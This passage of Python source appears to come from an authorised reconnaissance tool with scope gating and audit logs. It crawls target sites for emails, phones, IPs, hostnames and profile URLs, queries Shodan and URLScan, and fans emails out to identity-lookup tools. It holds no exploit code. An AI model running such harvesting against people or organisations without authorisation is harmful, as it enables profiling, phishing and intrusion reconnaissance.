                    )
                prepared_main_surface_entries = _run_inprocess_batch(
                    main_surface_parse_results,
                    _prepare_main_surface_result_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D surface result prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_main_surface_entries) > 1:
                    _log(
                        f"{iteration}.D surface merge",
                        "[dim]sequential dispatch x1[/dim]  [dim]aggregate merge order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_main_surface_entries,
                    lambda item: _apply_main_surface_result_entry(
                        item,
                        mined_out=mined,
                        crawl_urls_out=html_surface_urls,
                        passive_urls_out=passive_text_urls,
                        cloud_ref_groups_out=surface_cloud_ref_items,
                        github_orgs_out=all_github_orgs,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.D surface merge",
                    progress_callback=_record_batch_progress,
                )
            new_refs_this_iter = 0
            if not skip_cloud:
                cloud_ref_prepare_items = [
                    refs_by_service
                    for refs_by_service in surface_cloud_ref_items
                    if refs_by_service
                ]
                if len(cloud_ref_prepare_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D cloud-ref prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(cloud_ref_prepare_items))}[/dim]",
                    )
                prepared_cloud_ref_groups = _run_inprocess_batch(
                    cloud_ref_prepare_items,
                    _prepare_cloud_ref_batch_item,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D cloud-ref prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_cloud_ref_groups) > 1:
                    _log(
                        f"{iteration}.D cloud-ref merge",
                        "[dim]sequential dispatch x1[/dim]  [dim]cloud-ref order preserved[/dim]",
                )
                applied_cloud_ref_counts = _run_inprocess_batch(
                    prepared_cloud_ref_groups,
                    lambda item: _apply_cloud_ref_group(
                        item,
                        cloud_refs_out=all_cloud_refs,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.D cloud-ref merge",
                    progress_callback=_record_batch_progress,
                )
                cloud_ref_total_out = [0]
                _run_ordered_inprocess_apply_batch(
                    applied_cloud_ref_counts,
                    lambda item: _apply_int_total_item(
                        item,
                        total_out=cloud_ref_total_out,
                    ),
                    progress_label=f"{iteration}.D cloud-ref total apply",
                    progress_callback=_record_batch_progress,
                    order_note="cloud-ref result order preserved",
                )
                new_refs_this_iter += cloud_ref_total_out[0]
            new_emails_html = _persist_new_emails(
                mined["emails"],
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D email persist prep",
                progress_callback=_record_batch_progress,
            )
            new_phones_html = _persist_new_phone_seeds(
                mined["phones"],
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D phone persist prep",
                progress_callback=_record_batch_progress,
            )
            new_ips_html = _persist_new_ip_seeds(
                mined["ip_seeds"],
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D IP persist prep",
                progress_callback=_record_batch_progress,
            )
            new_hosts_html = _persist_new_hostnames(
                mined["subdomain_hints"],
                discovery="html_href_extract",
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D host persist prep",
                progress_callback=_record_batch_progress,
            )
            new_profile_urls = _persist_discovered_public_profile_urls(
                mined["public_profile_urls"],
                discovery="html_public_url_extract",
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D public profile persist prep",
                progress_callback=_record_batch_progress,
            )
            new_urls_html = _persist_discovered_crawl_urls(
                html_surface_urls,
                discovery="html_url_extract",
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D crawl URL persist prep",
                progress_callback=_record_batch_progress,
            )
            new_urls_passive = _persist_discovered_crawl_urls(
                passive_text_urls,
                discovery="passive_text_extract",
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D crawl URL persist prep",
                progress_callback=_record_batch_progress,
            )
            cloud_summary = (
                f"cloud={new_refs_this_iter}"
                if not skip_cloud
                else "cloud=skipped"
            )
            _log(f"{iteration}.D cloud+HTML mining",
                 f"scanned {len(hostnames)} hostname(s) "
                 f"[{'httpx-only' if no_playwright else 'playwright+httpx'}] "
                 f"| {cloud_summary} "
                 f"emails+={new_emails_html} phones+={new_phones_html} ips+={new_ips_html} hosts+={new_hosts_html} "
                 f"profile_urls+={new_profile_urls} html_urls+={new_urls_html} urls+={new_urls_passive} "
                 f"gh_orgs={len(mined['github_orgs'])}")

            # ─── Fan-out D3: Shodan enrichment per host discovered ───
            # Runs only on iteration 1 for the seed domain — /dns/resolve
            # is free, /shodan/host per IP costs no credits. Persists
            # discovered hosts + services + CVEs into the standard tables.
            d_specs: list[ModuleDispatchSpec] = []
            d_schedule_merge_inputs: list[dict[str, object]] = []
            if iteration == 1 and root_domains:
                pending_d3_domains, skipped_d3_domains = _partition_root_domains(
                    root_domains,
                    completed_domains=completed_d3_domains,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D3 root-domain prep",
                    progress_callback=_record_batch_progress,
                )
                d3_specs: list[ModuleDispatchSpec] = []
                if len(pending_d3_domains) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D3 spec prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(pending_d3_domains))}[/dim]",
                    )
                d3_specs = _run_inprocess_batch(
                        pending_d3_domains,
                        lambda root_domain: ModuleDispatchSpec(
                            cmd_argv=["osint", "shodan", "--engagement", engagement, "--target", root_domain],
                            label=f"{iteration}.D3 shodan ({root_domain})",
                            loop_name="fanout_d3_shodan",
                            seed_contexts=[_seed_context(root_domain, "domain")],
                            metadata={"iteration": iteration},
                        ),
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.D3 spec prep",
                        progress_callback=_record_batch_progress,
                    )
                d_schedule_merge_inputs.append(
                    {
                        "skip_logs": [
                            (
                                f"{iteration}.D3 shodan ({root_domain})",
                                "[dim]resume skip — already completed for this engagement[/dim]",
                            )
                            for root_domain in skipped_d3_domains
                        ],
                        "dispatch_specs": d3_specs,
                    }
                )

            # ─── Fan-out D4: URLScan.io related-domain discovery ─────
            # Public search API (100/day anon). Only fires on iteration 1
            # for the seed domain to conserve rate limit.
            if iteration == 1 and root_domains:
                pending_d4_domains, skipped_d4_domains = _partition_root_domains(
                    root_domains,
                    completed_domains=completed_d4_domains,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D4 root-domain prep",
                    progress_callback=_record_batch_progress,
                )
                d4_specs: list[ModuleDispatchSpec] = []
                if len(pending_d4_domains) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D4 spec prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(pending_d4_domains))}[/dim]",
                    )
                d4_specs = _run_inprocess_batch(
                        pending_d4_domains,
                        lambda root_domain: ModuleDispatchSpec(
                            cmd_argv=["osint", "urlscan", "--engagement", engagement, "--hostname", root_domain],
                            label=f"{iteration}.D4 urlscan ({root_domain})",
                            loop_name="fanout_d4_urlscan",
                            seed_contexts=[_seed_context(root_domain, "domain")],
                            metadata={"iteration": iteration},
                        ),
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.D4 spec prep",
                        progress_callback=_record_batch_progress,
                    )
                d_schedule_merge_inputs.append(
                    {
                        "skip_logs": [
                            (
                                f"{iteration}.D4 urlscan ({root_domain})",
                                "[dim]resume skip — already completed for this engagement[/dim]",
                            )
                            for root_domain in skipped_d4_domains
                        ],
                        "dispatch_specs": d4_specs,
                    }
                )
                if len(d_schedule_merge_inputs) > 1:
                    _log(
                        f"{iteration}.D passive schedule merge",
                        "[dim]sequential dispatch x1[/dim]  [dim]skip-log/spec order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    d_schedule_merge_inputs,
                    lambda item: _apply_passive_domain_schedule_reduction_item(
                        item,
                        dispatch_specs_out=d_specs,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.D passive schedule merge",
                    progress_callback=_record_batch_progress,
                )
                if d_specs:
                    d_provider_workers = _provider_limited_worker_count(d_specs, parallel_workers)
                    if len(d_specs) > 1:
                        _log(
                            f"{iteration}.D passive enrichers",
                            f"[dim]provider-bounded dispatch x{min(d_provider_workers, len(d_specs))}[/dim]",
                        )
                    _run_module_batch(
                        d_specs,
                        _run_module,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.D passive enrichers",
                        progress_callback=_record_batch_progress,
                    )
        elif dry_run_all:
            _emit_prepared_notice_log(
                f"{iteration}.D cloud+HTML mining",
                "[yellow]DRY-RUN-ALL[/yellow] would fetch + regex hostnames",
                progress_label_prefix=f"{iteration}.D",
                notice_suffix="dry-run",
                order_note="dry-run notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out D5: in-scope URL-seed surface mining ────────────
        # Re-enters operator-provided URL seeds and same-scope crawl URLs
        # back into the fetch/mining path so path-level pivots can yield
        # emails, cloud refs, artifacts, and more crawl URLs immediately.
        prioritized_url_seed_rows = _load_prioritized_seed_rows(
            "url",
            processed_url_seeds,
            normalizer=_normalize_url_seed_value,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.D5 URL seed load prep",
            progress_callback=_record_batch_progress,
        )
        if prioritized_url_seed_rows and len(prioritized_url_seed_rows) > 1 and parallel_workers > 1:
            _log(
                f"{iteration}.D5 URL seed scope prep",
                f"[dim]parallel parse x{min(parallel_workers, len(prioritized_url_seed_rows))}[/dim]",
            )
        url_seed_scope_decisions = [
            prepared_url_seed_row
            for prepared_url_seed_row in (
                _run_inprocess_batch(
                    prioritized_url_seed_rows,
                    _prepare_url_seed_scope_item,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL seed scope prep",
                    progress_callback=_record_batch_progress,
                )
            )
        ]
        denied_recursive_url_seeds = [
            item
            for item in url_seed_scope_decisions
            if isinstance(item, dict) and str(item.get("denied_url") or "").strip()
        ]
        if denied_recursive_url_seeds:
            _log(
                f"{iteration}.D5 URL seed scope",
                f"[yellow]denied={len(denied_recursive_url_seeds)} recursive URL seed(s) outside scope manifest[/yellow]",
            )
            for denied_item in denied_recursive_url_seeds:
                denied_url = str(denied_item.get("denied_url") or "").strip()
                if not denied_url:
                    continue
                _cli_audit(
                    db_path,
                    engagement_id,
                    "scope_gate",
                    "kill_chain",
                    "recursive_seed_scope_denied",
                    target=denied_url,
                    result=(
                        "seed_type=url "
                        f"reason={str(denied_item.get('deny_reason') or 'scope_manifest_denied')} "
                        f"host={str(denied_item.get('deny_hostname') or '')} "
                        f"scope_manifest={str(scope_manifest_metadata.get('source') or '')}"
                    )[:500],
                )
        pending_url_seed_rows = url_seed_scope_decisions
        if len(pending_url_seed_rows) > 1 and parallel_workers > 1:
            _log(
                f"{iteration}.D5 URL seed scope reduction",
                f"[dim]parallel parse x{min(parallel_workers, len(pending_url_seed_rows))}[/dim]",
            )
        prepared_pending_url_seed_rows = _run_inprocess_batch(
            pending_url_seed_rows,
            _prepare_url_seed_scope_reduction,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.D5 URL seed scope reduction",
            progress_callback=_record_batch_progress,
        )
        pending_url_seed_rows = []
        _run_ordered_inprocess_apply_batch(
            prepared_pending_url_seed_rows,
            lambda item: _apply_present_batch_item(
                item,
                batch_out=pending_url_seed_rows,
            ),
            progress_label=f"{iteration}.D5 URL seed scope apply",
            progress_callback=_record_batch_progress,
            order_note="pending URL seed order preserved",
        )
        if pending_url_seed_rows:
            if len(pending_url_seed_rows) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D5 URL schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(pending_url_seed_rows))}[/dim]",
                )
            scheduled_url_seed_rows = _run_inprocess_batch(
                pending_url_seed_rows,
                lambda item: {
                    "seed_value": str(item[0]),
                    "seed_depth": int(item[1] or 0),
                    "is_shallow": int(item[1] or 0) <= 1,
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D5 URL schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_url_seed_rows) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D5 URL schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_url_seed_rows))}[/dim]",
                )
            prepared_url_seed_schedule = _run_inprocess_batch(
                scheduled_url_seed_rows,
                _prepare_url_seed_schedule_reduction,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D5 URL schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_url_seed_schedule) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D5 URL batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_url_seed_schedule))}[/dim]",
                )
            prepared_url_batch_entries = _run_inprocess_batch(
                prepared_url_seed_schedule,
                _prepare_prioritized_batch_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D5 URL batch reduction",
                progress_callback=_record_batch_progress,
            )
            shallow_url_batch: list[tuple[str, int]] = []
            deeper_url_batch: list[tuple[str, int]] = []
            _run_ordered_inprocess_apply_batch(
                prepared_url_batch_entries,
                lambda item: _apply_prioritized_batch_entry_item(
                    item,
                    shallow_entries_out=shallow_url_batch,
                    deeper_entries_out=deeper_url_batch,
                ),
                progress_label=f"{iteration}.D5 URL batch apply",
                progress_callback=_record_batch_progress,
                order_note="prioritized URL batch order preserved",
            )
            url_seed_batch = shallow_url_batch + deeper_url_batch[
                : max(0, 20 - len(shallow_url_batch))
            ]
            if dry_run_all:
                _emit_prepared_notice_log(
                    f"{iteration}.D5 URL surface mining",
                    "[yellow]DRY-RUN-ALL[/yellow] would fetch in-scope URL seeds",
                    progress_label_prefix=f"{iteration}.D5 URL",
                    notice_suffix="dry-run",
                    order_note="dry-run notice order preserved",
                    max_workers=parallel_workers,
                    progress_callback=_record_batch_progress,
                )
                url_seed_dry_run_inputs = [
                    (url_seed, int(url_depth or 0), "fanout_d5_url_seed_html")
                    for url_seed, url_depth in url_seed_batch
                ]
                if len(url_seed_dry_run_inputs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D5 URL dry-run finalize prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(url_seed_dry_run_inputs))}[/dim]",
                    )
                prepared_url_seed_dry_run_entries = _run_inprocess_batch(
                    url_seed_dry_run_inputs,
                    _prepare_url_dry_run_skip_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL dry-run finalize prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_url_seed_dry_run_entries) > 1:
                    _log(
                        f"{iteration}.D5 URL dry-run finalize",
                        "[dim]sequential dispatch x1[/dim]  [dim]seed-run finalization order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_url_seed_dry_run_entries,
                    _apply_url_dry_run_skip_entry,
                    max_workers=1,
                    progress_label=f"{iteration}.D5 URL dry-run finalize",
                    progress_callback=_record_batch_progress,
                )
            else:
                url_seed_handles = _start_seed_run_handles_from_contexts(
                    [
                        _seed_context(
                            url_seed,
                            "url",
                            source="discovered",
                            depth=max(1, int(url_depth or 0)),
                            confidence=0.8,
                            metadata={"iteration": iteration},
                        )
                        for url_seed, url_depth in url_seed_batch
                    ],
                    loop_name_value="fanout_d5_url_seed_html",
                    base_metadata_value={},
                    progress_label_prefix=f"{iteration}.D5 URL",
                )
                if len(url_seed_batch) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D5 URL fetch spec prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(url_seed_batch))}[/dim]",
                    )
                url_fetch_specs = _run_inprocess_batch(
                    url_seed_batch,
                    lambda item: HtmlFetchSpec(
                        url=item[0],
                        use_playwright=_url_seed_should_use_playwright(item[0]),
                        playwright_timeout=15.0 if _url_seed_should_use_playwright(item[0]) else 0.0,
                        fallback_timeout=8.0,
                    ),
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL fetch spec prep",
                    progress_callback=_record_batch_progress,
                )
                if len(url_fetch_specs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D5 URL surface mining",
                        f"[dim]parallel fetch x{min(parallel_workers, len(url_fetch_specs))}[/dim]",
                    )
                url_surface_results = _run_html_fetch_batch(
                    url_fetch_specs,
                    _fetch_playwright_rendered,
                    _fetch_target_html,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL surface fetch",
                    progress_callback=_record_batch_progress,
                )
                url_surface_parse_urls = [
                    url_seed for url_seed, _url_depth in url_seed_batch
                ]
                url_surface_parse_items: list[tuple[str, Any]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(url_surface_results)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=url_surface_parse_urls,
                        pair_items_out=url_surface_parse_items,
                    ),
                    progress_label=f"{iteration}.D5 URL surface parse input apply",
                    progress_callback=_record_batch_progress,
                    order_note="URL surface parse input order preserved",
                )
                if len(url_surface_parse_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D5 URL surface parse",
                        f"[dim]parallel parse x{min(parallel_workers, len(url_surface_parse_items))}[/dim]",
                    )
                url_surface_mining_results = _run_inprocess_batch(
                    url_surface_parse_items,
                    lambda item: {
                        "mined": _extract_html_data(item[1], base_url=item[0]),
                        "cloud_refs": _extract_cloud_refs(item[1]) if not skip_cloud and item[1] else {},
                    },
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL surface parse",
                    progress_callback=_record_batch_progress,
                )
                url_cloud_ref_groups: list[list[tuple[str, str]]] = [
                    [] for _ in url_surface_mining_results
                ]
                if not skip_cloud:
                    url_cloud_ref_prepare_inputs: list[tuple[Any, Any]] = []
                    _run_ordered_inprocess_apply_batch(
                        list(enumerate(url_surface_mining_results)),
                        lambda item: _apply_indexed_pair_item(
                            item,
                            leading_values=url_surface_results,
                            pair_items_out=url_cloud_ref_prepare_inputs,
                        ),
                        progress_label=f"{iteration}.D5 cloud-ref prep input apply",
                        progress_callback=_record_batch_progress,
                        order_note="URL surface cloud-ref input order preserved",
                    )
                    url_cloud_ref_prepare_items = _run_inprocess_batch(
                        url_cloud_ref_prepare_inputs,
                        lambda item: item[1]["cloud_refs"] if item[0] else {},
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.D5 cloud-ref prep input parse",
                        progress_callback=_record_batch_progress,
                    )
                    if len(url_cloud_ref_prepare_items) > 1 and parallel_workers > 1:
                        _log(
                            f"{iteration}.D5 cloud-ref prep",
                            f"[dim]parallel parse x{min(parallel_workers, len(url_cloud_ref_prepare_items))}[/dim]",
                        )
                    url_cloud_ref_groups = _run_inprocess_batch(
                        url_cloud_ref_prepare_items,
                        _prepare_cloud_ref_batch_item,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.D5 cloud-ref prep",
                        progress_callback=_record_batch_progress,
                    )
                url_surface_result_items: list[
                    tuple[
                        tuple[str, int],
                        Any,
                        Any,
                        Any,
                        list[tuple[str, str]],
                    ]
                ] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(url_surface_mining_results)),
                    lambda item: _apply_indexed_url_surface_result_item(
                        item,
                        url_seed_rows=url_seed_batch,
                        url_handles=url_seed_handles,
                        payloads=url_surface_results,
                        cloud_ref_groups=url_cloud_ref_groups,
                        result_items_out=url_surface_result_items,
                    ),
                    progress_label=f"{iteration}.D5 URL surface result input apply",
                    progress_callback=_record_batch_progress,
                    order_note="URL surface result input order preserved",
                )
                if len(url_surface_result_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D5 URL surface result prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(url_surface_result_items))}[/dim]",
                    )
                prepared_url_surface_entries = _run_inprocess_batch(
                    url_surface_result_items,
                    _prepare_url_surface_result_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL surface result prep",
                    progress_callback=_record_batch_progress,
                )
                url_child_metadata = _url_surface_child_metadata(
                    prepared_url_surface_entries,
                    source_metadata_by_url=_load_url_seed_source_metadata(url_seed_batch),
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL surface child metadata prep",
                    progress_callback=_record_batch_progress,
                )
                url_cloud_refs_added = 0
                url_batch_mined = _empty_html_mined_result()
                url_github_org_hits = 0
                if len(prepared_url_surface_entries) > 1:
                    _log(
                        f"{iteration}.D5 URL surface merge",
                        "[dim]sequential dispatch x1[/dim]  [dim]aggregate merge order preserved[/dim]",
                    )
                applied_url_surface_results = _run_inprocess_batch(
                    prepared_url_surface_entries,
                    lambda item: _apply_url_surface_result_entry(
                        item,
                        batch_mined_out=url_batch_mined,
                        cloud_refs_out=all_cloud_refs,
                        github_orgs_out=all_github_orgs,
                        skip_cloud_value=skip_cloud,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.D5 URL surface merge",
                    progress_callback=_record_batch_progress,
                )
                url_item_cloud_ref_counts: list[int] = []
                url_github_org_total_out = [0]
                _run_ordered_inprocess_apply_batch(
                    applied_url_surface_results,
                    lambda item: _apply_url_surface_result_total_item(
                        item,
                        cloud_ref_counts_out=url_item_cloud_ref_counts,
                        github_org_hits_total_out=url_github_org_total_out,
                    ),
                    progress_label=f"{iteration}.D5 URL surface result total apply",
                    progress_callback=_record_batch_progress,
                    order_note="URL surface result summary order preserved",
                )
                url_cloud_refs_added += sum(url_item_cloud_ref_counts)
                url_github_org_hits += url_github_org_total_out[0]
                url_emails_added = _persist_new_emails(
                    url_batch_mined["emails"],
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 email persist prep",
                    progress_callback=_record_batch_progress,
                )
                url_phones_added = _persist_new_phone_seeds(
                    url_batch_mined["phones"],
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 phone persist prep",
                    progress_callback=_record_batch_progress,
                )
                url_ips_added = _persist_new_ip_seeds(
                    url_batch_mined["ip_seeds"],
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 IP persist prep",
                    progress_callback=_record_batch_progress,
                )
                url_hosts_added = _persist_new_hostnames(
                    url_batch_mined["subdomain_hints"],
                    discovery="html_href_extract",
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 host persist prep",
                    progress_callback=_record_batch_progress,
                )
                url_profile_urls_added = _persist_discovered_public_profile_urls(
                    url_batch_mined["public_profile_urls"],
                    discovery="url_seed_extract",
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 public profile persist prep",
                    progress_callback=_record_batch_progress,
                )
                url_crawl_urls_added = _persist_discovered_crawl_urls(
                    url_batch_mined["crawl_urls"],
                    discovery="url_seed_extract",
                    url_metadata=url_child_metadata,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 crawl URL persist prep",
                    progress_callback=_record_batch_progress,
                )
                url_surface_finalize_inputs: list[tuple[dict[str, object], int]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(url_item_cloud_ref_counts)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=prepared_url_surface_entries,
                        pair_items_out=url_surface_finalize_inputs,
                    ),
                    progress_label=f"{iteration}.D5 URL surface finalize input apply",
                    progress_callback=_record_batch_progress,
                    order_note="URL surface finalize input order preserved",
                )
                if len(url_surface_finalize_inputs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D5 URL surface finalize prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(url_surface_finalize_inputs))}[/dim]"
                        ),
                    )
                prepared_url_surface_finalize_entries = _run_inprocess_batch(
                    url_surface_finalize_inputs,
                    _prepare_url_surface_finalize_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D5 URL surface finalize prep",
                    progress_callback=_record_batch_progress,
                )
                if len(url_surface_finalize_inputs) > 1:
                    _log(
                        f"{iteration}.D5 URL surface finalize",
                        "[dim]sequential dispatch x1[/dim]  [dim]seed-run finalization order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_url_surface_finalize_entries,
                    _apply_url_surface_finalize_entry,
                    max_workers=1,
                    progress_label=f"{iteration}.D5 URL surface finalize",
                    progress_callback=_record_batch_progress,
                )
                cloud_summary = (
                    f"cloud={url_cloud_refs_added}"
                    if not skip_cloud
                    else "cloud=skipped"
                )
                _log(
                    f"{iteration}.D5 URL surface mining",
                    (
                        f"scanned {len(url_seed_batch)} URL seed(s) | {cloud_summary} "
                        f"emails+={url_emails_added} phones+={url_phones_added} "
                        f"ips+={url_ips_added} hosts+={url_hosts_added} "
                        f"profile_urls+={url_profile_urls_added} urls+={url_crawl_urls_added} "
                        f"gh_orgs={url_github_org_hits}"
                    ),
                )
            if len(url_seed_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D5 URL processed-seed prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(url_seed_batch))}[/dim]"
                    ),
                )
            prepared_url_seed_updates = _run_inprocess_batch(
                url_seed_batch,
                lambda item: _prepare_processed_set_item(
                    item[0],
                    normalizer=_normalize_url_seed_value,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D5 URL processed-seed prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_url_seed_updates) > 1:
                _log(
                    f"{iteration}.D5 URL processed-seed update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-seed order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_url_seed_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_url_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.D5 URL processed-seed update",
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out E: per-iteration email chain ─────────────────────
        # Any emails discovered THIS iteration (from harvest + HTML mining)
        # get processed immediately so downstream discoveries feed the
        # next iteration. Deduped against already-processed set.
        iter_emails = _load_new_emails(
            processed_emails,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.E email load prep",
            progress_callback=_record_batch_progress,
        )
        if iter_emails:
            iter_email_inputs = sorted(iter_emails)
            if len(iter_email_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(iter_email_inputs))}[/dim]",
                )
            prepared_iter_email_batch = _run_inprocess_batch(
                iter_email_inputs,
                _prepare_simple_batch_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email batch reduction",
                progress_callback=_record_batch_progress,
            )
            iter_email_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_iter_email_batch,
                lambda item: _apply_simple_limited_batch_item(
                    item,
                    batch_out=iter_email_batch,
                    limit=20,
                ),
                progress_label=f"{iteration}.E email batch apply",
                progress_callback=_record_batch_progress,
                order_note="email batch order preserved",
            )
            _log(f"{iteration}.E email fan-out",
                 f"[green]{len(iter_emails)} new email(s) -> xposed/emailrep/holehe/social/sherlock/gravatar[/green]")
            e_specs: list[ModuleDispatchSpec] = []
            e_spec_emails: list[str] = []
            identity_lookup_specs: list[ModuleDispatchSpec] = []
            identity_lookup_spec_emails: list[str] = []
            reputation_specs: list[ModuleDispatchSpec] = []
            reputation_spec_emails: list[str] = []
            inferred_by_email: dict[str, list[str]] = {}
            inferred_handles: set[str] = set()
            if len(iter_email_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E localpart parse",
                    f"[dim]parallel parse x{min(parallel_workers, len(iter_email_batch))}[/dim]",
                )
            inferred_handle_batches = _run_inprocess_batch(
                iter_email_batch,
                _email_localpart_usernames,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E localpart parse",
                progress_callback=_record_batch_progress,
            )
            email_spec_prepare_items: list[tuple[str, list[str]]] = []
            _run_ordered_inprocess_apply_batch(
                list(enumerate(inferred_handle_batches)),
                lambda item: _apply_indexed_pair_item(
                    item,
                    leading_values=iter_email_batch,
                    pair_items_out=email_spec_prepare_items,
                ),
                progress_label=f"{iteration}.E email spec input apply",
                progress_callback=_record_batch_progress,
                order_note="email spec input order preserved",
            )
            if len(email_spec_prepare_items) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(email_spec_prepare_items))}[/dim]",
                )
            prepared_email_spec_batches = _run_inprocess_batch(
                email_spec_prepare_items,
                _prepare_email_fanout_specs,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_email_spec_batches) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_email_spec_batches))}[/dim]",
                )
            scheduled_email_entries = _run_inprocess_batch(
                prepared_email_spec_batches,
                lambda item: {
                    "email": str(item["email"]),
                    "inferred_handles": list(item["inferred_handles"]),
                    "dispatch_specs": list(item["dispatch_specs"]),
                    "identity_lookup_specs": list(item["identity_lookup_specs"]),
                    "reputation_spec": item["reputation_spec"],
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_email_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_email_entries))}[/dim]",
                )
            prepared_email_schedule_reductions = _run_inprocess_batch(
                scheduled_email_entries,
                _prepare_email_schedule_reduction,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_email_schedule_reductions) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email aggregation reduction",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(prepared_email_schedule_reductions))}[/dim]"
                    ),
                )
            prepared_email_schedule_aggregations = _run_inprocess_batch(
                prepared_email_schedule_reductions,
                _prepare_email_schedule_aggregation_item,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email aggregation reduction",
                progress_callback=_record_batch_progress,
